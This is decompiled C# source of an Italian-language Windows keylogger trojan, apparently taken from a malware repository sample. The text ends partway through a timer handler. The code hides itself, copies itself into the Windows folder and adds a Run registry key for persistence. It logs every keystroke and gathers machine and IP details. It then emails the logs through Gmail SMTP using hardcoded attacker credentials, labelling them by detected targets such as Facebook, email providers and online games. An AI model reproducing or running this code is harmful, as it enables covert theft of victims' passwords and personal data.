// Decompiled with JetBrains decompiler
// Type: svchost.Form1
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6DDBD699-C351-46D2-B577-5A47AADA2B4A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.Win32.Fsysna.aosz-f36b3708132e2fa5f4ec88bd5083bea5f9eec00306e2cfb2271ed154a4173bfb.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using svchost.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace svchost
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    private int result;
    private IPHostEntry ip;
    private WebClient webclient;
    private string externalip;
    private string internalip;
    private MailMessage emailer;
    private SmtpClient smtp;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.ip = Dns.GetHostEntry(Dns.GetHostName());
      this.webclient = new WebClient();
      this.emailer = new MailMessage();
      this.smtp = new SmtpClient("smtp.gmail.com");
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Label1 = new Label();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.TextBox4 = new TextBox();
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      Point point1 = new Point(265, 16);
      Point point2 = point1;
      label1_1.Location = point2;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      Size size1 = new Size(103, 13);
      Size size2 = size1;
      label1_2.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Rete non disponibile";
      this.Label1.Visible = false;
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(265, 52);
      Point point3 = point1;
      label2_1.Location = point3;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(103, 13);
      Size size3 = size1;
      label2_2.Size = size3;
      this.Label2.TabIndex = 1;
      this.Label2.Text = "Rete non disponibile";
      this.Label2.Visible = false;
      this.Label3.AutoSize = true;
      Label label3_1 = this.Label3;
      point1 = new Point(12, 85);
      Point point4 = point1;
      label3_1.Location = point4;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(128, 13);
      Size size4 = size1;
      label3_2.Size = size4;
      this.Label3.TabIndex = 2;
      this.Label3.Text = "anonymogtx2@gmail.com";
      this.Label3.Visible = false;
      this.Label4.AutoSize = true;
      Label label4_1 = this.Label4;
      point1 = new Point(75, 109);
      Point point5 = point1;
      label4_1.Location = point5;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(119, 13);
      Size size5 = size1;
      label4_2.Size = size5;
      this.Label4.TabIndex = 3;
      this.Label4.Text = "17/2/95741085209630";
      this.Label4.Visible = false;
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 900000;
      this.Timer2.Enabled = true;
      this.Timer2.Interval = 1;
      this.Timer4.Enabled = true;
      this.Timer4.Interval = 15000;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(45, 190);
      Point point6 = point1;
      textBox1_1.Location = point6;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(100, 20);
      Size size6 = size1;
      textBox1_2.Size = size6;
      this.TextBox1.TabIndex = 4;
      this.TextBox1.Visible = false;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(138, 52);
      Point point7 = point1;
      textBox2_1.Location = point7;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(100, 20);
      Size size7 = size1;
      textBox2_2.Size = size7;
      this.TextBox2.TabIndex = 5;
      this.TextBox2.Visible = false;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(173, 102);
      Point point8 = point1;
      textBox3_1.Location = point8;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(100, 20);
      Size size8 = size1;
      textBox3_2.Size = size8;
      this.TextBox3.TabIndex = 6;
      this.TextBox3.Visible = false;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(217, 190);
      Point point9 = point1;
      textBox4_1.Location = point9;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(100, 20);
      Size size9 = size1;
      textBox4_2.Size = size9;
      this.TextBox4.TabIndex = 7;
      this.TextBox4.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(391, 236);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label Label2
    {
      [DebuggerNonUserCode] get => this._Label2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Label Label3
    {
      [DebuggerNonUserCode] get => this._Label3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
    }

    internal virtual Label Label4
    {
      [DebuggerNonUserCode] get => this._Label4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label4 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        if (this._Timer4 != null)
          this._Timer4.Tick -= eventHandler;
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this._TextBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vKey);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyState(long nVirtKey);

    public bool GetCapslock() => (Form1.GetKeyState(20L) & 1) != 0;

    public bool GetShift() => Form1.GetAsyncKeyState(16L) != 0;

    private void Form1_Load(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.Opacity = 0.0;
label_3:
        num3 = 3;
        this.ShowInTaskbar = false;
label_4:
        num3 = 4;
        this.ShowIcon = false;
label_5:
        num3 = 5;
        this.Visible = false;
label_6:
        num3 = 6;
        this.Hide();
label_7:
        num3 = 7;
        if (System.IO.File.Exists("C:\\Windows\\deepolis_hack.exe"))
          goto label_11;
label_8:
        num3 = 9;
label_9:
        num3 = 10;
        System.IO.File.Delete("C:\\Windows\\svchost.exe");
label_10:
        num3 = 11;
        System.IO.File.Move(Application.ExecutablePath, "C:\\Windows\\deepolis_hack.exe");
label_11:
label_12:
        num3 = 13;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "deepolis_hack.exe", (object) Application.ExecutablePath);
        goto label_19;
label_14:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
              case 12:
                goto label_11;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 13:
                goto label_12;
              case 14:
                goto label_19;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_14;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_19:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      int num1 = 1;
      do
      {
        this.result = 0;
        this.result = Form1.GetAsyncKeyState((long) num1);
        if (this.result == -32767)
        {
          if (!this.GetCapslock() & this.GetShift())
          {
            switch (num1)
            {
              case 1:
                this.TextBox1.Text += " [LMB] ";
                break;
              case 2:
                this.TextBox1.Text += " [RMB] ";
                break;
              case 8:
                this.TextBox1.Text += " [Del] ";
                break;
              case 9:
                this.TextBox1.Text += " [Tab] \r\n";
                break;
              case 13:
                this.TextBox1.Text += " [Invio] \r\n";
                break;
              case 17:
                this.TextBox1.Text += " [Ctrl] ";
                break;
              case 18:
                this.TextBox1.Text += " [Alt] ";
                break;
              case 32:
                this.TextBox1.Text += " ";
                break;
              case 46:
                this.TextBox1.Text += " [Del] ";
                break;
              case 48:
                this.TextBox1.Text += ")";
                break;
              case 49:
                this.TextBox1.Text += "!";
                break;
              case 51:
                this.TextBox1.Text += "#";
                break;
              case 52:
                this.TextBox1.Text += "$";
                break;
              case 53:
                this.TextBox1.Text += "%";
                break;
              case 54:
                this.TextBox1.Text += "^";
                break;
              case 55:
                this.TextBox1.Text += "&";
                break;
              case 56:
                this.TextBox1.Text += "*";
                break;
              case 57:
                this.TextBox1.Text += "(";
                break;
              case 64:
              case 65:
              case 66:
              case 67:
              case 68:
              case 69:
              case 70:
              case 71:
              case 72:
              case 73:
              case 74:
              case 75:
              case 76:
              case 77:
              case 78:
              case 79:
              case 80:
              case 81:
              case 82:
              case 83:
              case 84:
              case 85:
              case 86:
              case 87:
              case 88:
              case 89:
              case 90:
                this.TextBox1.Text += Strings.Chr(num1).ToString().ToLower();
                break;
              case 97:
              case 98:
              case 99:
              case 100:
              case 101:
              case 102:
              case 103:
              case 104:
              case 105:
              case 106:
              case 107:
              case 108:
              case 109:
              case 110:
              case 111:
              case 112:
              case 113:
              case 114:
              case 115:
              case 116:
              case 117:
              case 118:
              case 119:
              case 120:
              case 121:
              case 122:
                this.TextBox1.Text += Strings.Chr(num1).ToString().ToLower();
                break;
              case 186:
                this.TextBox1.Text += "é";
                break;
              case 187:
                this.TextBox1.Text += "+";
                break;
              case 188:
                this.TextBox1.Text += "<";
                break;
              case 189:
                this.TextBox1.Text += "_";
                break;
              case 190:
                this.TextBox1.Text += ">";
                break;
              case 191:
                this.TextBox1.Text += "?";
                break;
              case 192:
                this.TextBox1.Text += "~";
                break;
              case 219:
                this.TextBox1.Text += "?";
                break;
              case 220:
                this.TextBox1.Text += "|";
                break;
              case 221:
                this.TextBox1.Text += "^";
                break;
              case 222:
                this.TextBox1.Text += "\"";
                break;
            }
          }
          if (this.GetCapslock() & !this.GetShift())
          {
            int num2 = num1;
            switch (num2)
            {
              case 1:
                this.TextBox1.Text += " [LMB] ";
                goto case 91;
              case 2:
                this.TextBox1.Text += " [RMB] ";
                goto case 91;
              case 91:
label_54:
                break;
              default:
                if (num2 >= 64 && num2 <= 90)
                {
                  this.TextBox1.Text += Conversions.ToString(Strings.Chr(num1));
                  goto case 91;
                }
                else if (num2 >= 97 && num2 <= 122)
                {
                  this.TextBox1.Text += Conversions.ToString(Strings.Chr(num1));
                  goto case 91;
                }
                else if (num2 == 32)
                {
                  this.TextBox1.Text += " ";
                  goto case 91;
                }
                else if (num2 >= 48 && num2 <= 57)
                {
                  this.TextBox1.Text += Conversions.ToString(Strings.Chr(num1));
                  goto case 91;
                }
                else
                {
                  switch (num2)
                  {
                    case 8:
                      this.TextBox1.Text += " [Del] ";
                      goto label_54;
                    case 16:
                      goto label_54;
                    case 46:
                      this.TextBox1.Text += " [Del] ";
                      goto label_54;
                    case 190:
                      this.TextBox1.Text += ".";
                      goto label_54;
                    default:
                      if (num2 < 160 || num2 > 165)
                        goto label_54;
                      else
                        goto label_54;
                  }
                }
            }
          }
          if (!this.GetCapslock() & !this.GetShift())
          {
            switch (num1)
            {
              case 1:
                this.TextBox1.Text += " [LMB] ";
                goto case 16;
              case 2:
                this.TextBox1.Text += " [RMB] ";
                goto case 16;
              case 8:
                this.TextBox1.Text += " [Del] ";
                goto case 16;
              case 9:
                this.TextBox1.Text += " [Tab] \r\n";
                goto case 16;
              case 13:
                this.TextBox1.Text += " [Invio] \r\n";
                goto case 16;
              case 16:
              case 20:
              case 37:
              case 38:
              case 39:
              case 40:
              case 91:
              case 160:
              case 161:
              case 162:
              case 163:
              case 164:
              case 165:
                break;
              case 17:
                this.TextBox1.Text += " [Ctrl] ";
                goto case 16;
              case 18:
                this.TextBox1.Text += " [Alt] ";
                goto case 16;
              case 32:
                this.TextBox1.Text += " ";
                goto case 16;
              case 46:
                this.TextBox1.Text += " [Del] ";
                goto case 16;
              case 48:
              case 49:
              case 50:
              case 51:
              case 52:
              case 53:
              case 54:
              case 55:
              case 56:
              case 57:
                this.TextBox1.Text += Conversions.ToString(Strings.Chr(num1));
                goto case 16;
              case 64:
              case 65:
              case 66:
              case 67:
              case 68:
              case 69:
              case 70:
              case 71:
              case 72:
              case 73:
              case 74:
              case 75:
              case 76:
              case 77:
              case 78:
              case 79:
              case 80:
              case 81:
              case 82:
              case 83:
              case 84:
              case 85:
              case 86:
              case 87:
              case 88:
              case 89:
              case 90:
                this.TextBox1.Text += Strings.Chr(num1).ToString().ToLower();
                goto case 16;
              case 97:
              case 98:
              case 99:
              case 100:
              case 101:
              case 102:
              case 103:
              case 104:
              case 105:
              case 106:
              case 107:
              case 108:
              case 109:
              case 110:
              case 111:
              case 112:
              case 113:
              case 114:
              case 115:
              case 116:
              case 117:
              case 118:
              case 119:
              case 120:
              case 121:
              case 122:
                this.TextBox1.Text += Strings.Chr(num1).ToString().ToLower();
                goto case 16;
              case 186:
                this.TextBox1.Text += "è";
                goto case 16;
              case 187:
                this.TextBox1.Text += "+";
                goto case 16;
              case 188:
                this.TextBox1.Text += ",";
                goto case 16;
              case 189:
                this.TextBox1.Text += "-";
                goto case 16;
              case 190:
                this.TextBox1.Text += ".";
                goto case 16;
              case 191:
                this.TextBox1.Text += "ù";
                goto case 16;
              case 192:
                this.TextBox1.Text += "ò";
                goto case 16;
              case 219:
                this.TextBox1.Text += "'";
                goto case 16;
              case 220:
                this.TextBox1.Text += "\\";
                goto case 16;
              case 221:
                this.TextBox1.Text += "ì";
                goto case 16;
              case 222:
                this.TextBox1.Text += "à";
                goto case 16;
              default:
                goto case 16;
            }
          }
        }
        checked { ++num1; }
      }
      while (num1 <= 225);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        IPAddress[] addressList = this.ip.AddressList;
        int index = 0;
        goto label_10;
label_4:
        num3 = 3;
        IPAddress ipAddress;
        if (ipAddress.AddressFamily != AddressFamily.InterNetwork)
          goto label_6;
label_5:
        num3 = 4;
        this.Label1.Text = ipAddress.ToString();
label_6:
label_7:
        num3 = 6;
        this.externalip = this.webclient.DownloadString("http://automation.whatismyip.com/n09230945.asp");
label_8:
        num3 = 7;
        this.Label2.Text = this.externalip.ToString();
        checked { ++index; }
label_9:
        num3 = 8;
label_10:
        if (index < addressList.Length)
        {
          ipAddress = addressList[index];
          goto label_4;
        }
label_11:
        num3 = 9;
        this.TextBox2.Text = this.TextBox2.Text + "Nome Computer: " + MyProject.Computer.Name + "\r\n";
label_12:
        num3 = 10;
        this.TextBox2.Text = this.TextBox2.Text + "Nome Utente: " + MyProject.User.Name + "\r\n\r\n";
label_13:
        num3 = 11;
        this.TextBox2.Text = this.TextBox2.Text + "IP Interno: " + this.Label1.Text + "\r\n";
label_14:
        num3 = 12;
        this.TextBox2.Text = this.TextBox2.Text + "IP Esterno: " + this.Label2.Text + "\r\n\r\n";
label_15:
        num3 = 13;
        this.TextBox2.Text = this.TextBox2.Text + "Lingua utente: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\n";
label_16:
        num3 = 14;
        this.TextBox2.Text = this.TextBox2.Text + "Sistema Operativo: " + MyProject.Computer.Info.OSFullName + "\r\n\r\n";
label_17:
        num3 = 15;
        this.TextBox2.Text = this.TextBox2.Text + "Memoria fisica libera (RAM): " + MyProject.Computer.Info.AvailablePhysicalMemory.ToString() + " byte\r\n";
label_18:
        num3 = 16;
        this.TextBox2.Text = this.TextBox2.Text + "Memoria fisica totale (RAM): " + MyProject.Computer.Info.TotalPhysicalMemory.ToString() + " byte\r\n";
label_19:
        num3 = 17;
        this.TextBox2.Text = this.TextBox2.Text + "Memoria virtuale libera: " + MyProject.Computer.Info.AvailableVirtualMemory.ToString() + " byte\r\n";
label_20:
        num3 = 18;
        this.TextBox2.Text = this.TextBox2.Text + "Memoria virtuale totale: " + MyProject.Computer.Info.TotalVirtualMemory.ToString() + " byte\r\n";
label_21:
        num3 = 19;
        this.emailer.From = new MailAddress(this.Label3.Text);
label_22:
        num3 = 20;
        this.emailer.To.Add(this.Label3.Text);
label_23:
        num3 = 21;
        this.emailer.Body = this.TextBox1.Text + "\r\n\r\n\r\n\r\n\r\n\r\n\r\n" + this.TextBox2.Text;
label_24:
        num3 = 22;
        if (!(this.TextBox1.Text.Contains("metin2") | this.TextBox1.Text.Contains("metin") | this.TextBox1.Text.Contains("mt2")))
          goto label_26;
label_25:
        num3 = 23;
        this.emailer.Subject = "[METIN2] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_26:
        num3 = 25;
        if (!(this.TextBox1.Text.Contains("warrock") | this.TextBox1.Text.Contains("war rock")))
          goto label_28;
label_27:
        num3 = 26;
        this.emailer.Subject = "[WARROCK] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_28:
        num3 = 28;
        if (!(this.TextBox1.Text.Contains("combat") | this.TextBox1.Text.Contains("combat arms") | this.TextBox1.Text.Contains("caeu") | this.TextBox1.Text.Contains("ca eu")))
          goto label_30;
label_29:
        num3 = 29;
        this.emailer.Subject = "[COMBAT ARMS] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_30:
        num3 = 31;
        if (!(this.TextBox1.Text.Contains("seafight") | this.TextBox1.Text.Contains("sea fight")))
          goto label_32;
label_31:
        num3 = 32;
        this.emailer.Subject = "[SEAFIGHT] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_32:
        num3 = 34;
        if (!(this.TextBox1.Text.Contains("hotmail") | this.TextBox1.Text.Contains("live.it") | this.TextBox1.Text.Contains("live.com") | this.TextBox1.Text.Contains("hotmail.it") | this.TextBox1.Text.Contains("hotmail.com") | this.TextBox1.Text.Contains("msn") | this.TextBox1.Text.Contains("msn.it")))
          goto label_34;
label_33:
        num3 = 35;
        this.emailer.Subject = "[HOTMAIL] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_34:
        num3 = 37;
        if (!(this.TextBox1.Text.Contains("libero.it") | this.TextBox1.Text.Contains("libero.com")))
          goto label_36;
label_35:
        num3 = 38;
        this.emailer.Subject = "[LIBERO] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_36:
        num3 = 40;
        if (!(this.TextBox1.Text.Contains("gmail") | this.TextBox1.Text.Contains("google mail") | this.TextBox1.Text.Contains("gmail.com")))
          goto label_38;
label_37:
        num3 = 41;
        this.emailer.Subject = "[GMAIL] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_38:
        num3 = 43;
        if (!(this.TextBox1.Text.Contains("yahoo") | this.TextBox1.Text.Contains("yahoo.it") | this.TextBox1.Text.Contains("yahoo.com")))
          goto label_40;
label_39:
        num3 = 44;
        this.emailer.Subject = "[YAHOO] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_40:
        num3 = 46;
        if (!(this.TextBox1.Text.Contains("tiscali") | this.TextBox1.Text.Contains("tiscali.it")))
          goto label_42;
label_41:
        num3 = 47;
        this.emailer.Subject = "[TISCALI] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_42:
        num3 = 49;
        if (!(this.TextBox1.Text.Contains("facebook") | this.TextBox1.Text.Contains("facebook.com")))
          goto label_44;
label_43:
        num3 = 50;
        this.emailer.Subject = "[FACEBOOK] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_44:
        num3 = 52;
        if (!(this.TextBox1.Text.Contains("darkorbit") | this.TextBox1.Text.Contains("dark orbit")))
          goto label_46;
label_45:
        num3 = 53;
        this.emailer.Subject = "[DARK ORBIT] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_46:
        num3 = 55;
        if (!(this.TextBox1.Text.Contains("bigpoint") | this.TextBox1.Text.Contains("big point")))
          goto label_48;
label_47:
        num3 = 56;
        this.emailer.Subject = "[BIGPOINT] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_48:
        num3 = 58;
        if (!(this.TextBox1.Text.Contains("gameforge") | this.TextBox1.Text.Contains("game forge")))
          goto label_50;
label_49:
        num3 = 59;
        this.emailer.Subject = "[GAMEFORGE] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_50:
        num3 = 61;
        if (!this.TextBox1.Text.Contains("world of warcraft"))
          goto label_52;
label_51:
        num3 = 62;
        this.emailer.Subject = "[WORLD OF WARCRAFT] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_52:
        num3 = 64;
        if (!this.TextBox1.Text.Contains("@"))
          goto label_54;
label_53:
        num3 = 65;
        this.emailer.Subject = "[E-MAIL] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_54:
        num3 = 67;
        if (!this.TextBox1.Text.Contains("skype"))
          goto label_56;
label_55:
        num3 = 68;
        this.emailer.Subject = "[SKYPE] Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
        goto label_58;
label_56:
        num3 = 70;
label_57:
        num3 = 71;
        this.emailer.Subject = "Dati KeyLogger -    " + this.Label1.Text + " / " + this.Label2.Text;
label_58:
label_59:
        num3 = 73;
        this.smtp.Port = 587;
label_60:
        num3 = 74;
        this.smtp.EnableSsl = true;
label_61:
        num3 = 75;
        this.smtp.Credentials = (ICredentialsByHost) new NetworkCredential(this.Label3.Text, this.Label4.Text);
label_62:
        num3 = 76;
        this.smtp.Send(this.emailer);
label_63:
        num3 = 77;
        this.TextBox1.Text = "";
label_64:
        num3 = 78;
        this.TextBox2.Text = "";
        goto label_71;
label_66:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_7;
              case 7:
                goto label_8;
              case 8:
                goto label_9;
              case 9:
                goto label_11;
              case 10:
                goto label_12;
              case 11:
                goto label_13;
              case 12:
                goto label_14;
              case 13:
                goto label_15;
              case 14:
                goto label_16;
              case 15:
                goto label_17;
              case 16:
                goto label_18;
              case 17:
                goto label_19;
              case 18:
                goto label_20;
              case 19:
                goto label_21;
              case 20:
                goto label_22;
              case 21:
                goto label_23;
              case 22:
                goto label_24;
              case 23:
                goto label_25;
              case 24:
              case 27:
              case 30:
              case 33:
              case 36:
              case 39:
              case 42:
              case 45:
              case 48:
              case 51:
              case 54:
              case 57:
              case 60:
              case 63:
              case 66:
              case 69:
              case 72:
                goto label_58;
              case 25:
                goto label_26;
              case 26:
                goto label_27;
              case 28:
                goto label_28;
              case 29:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 34:
                goto label_32;
              case 35:
                goto label_33;
              case 37:
                goto label_34;
              case 38:
                goto label_35;
              case 40:
                goto label_36;
              case 41:
                goto label_37;
              case 43:
                goto label_38;
              case 44:
                goto label_39;
              case 46:
                goto label_40;
              case 47:
                goto label_41;
              case 49:
                goto label_42;
              case 50:
                goto label_43;
              case 52:
                goto label_44;
              case 53:
                goto label_45;
              case 55:
                goto label_46;
              case 56:
                goto label_47;
              case 58:
                goto label_48;
              case 59:
                goto label_49;
              case 61:
                goto label_50;
              case 62:
                goto label_51;
              case 64:
                goto label_52;
              case 65:
                goto label_53;
              case 67:
                goto label_54;
              case 68:
                goto label_55;
              case 70:
                goto label_56;
              case 71:
                goto label_57;
              case 73:
                goto label_59;
              case 74:
                goto label_60;
              case 75:
                goto label_61;
              case 76:
                goto label_62;
              case 77:
                goto label_63;
              case 78:
                goto label_64;
              case 79:
                goto label_71;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_66;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_71:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (!System.IO.File.Exists("C:\\Windows\\svchost.txt"))
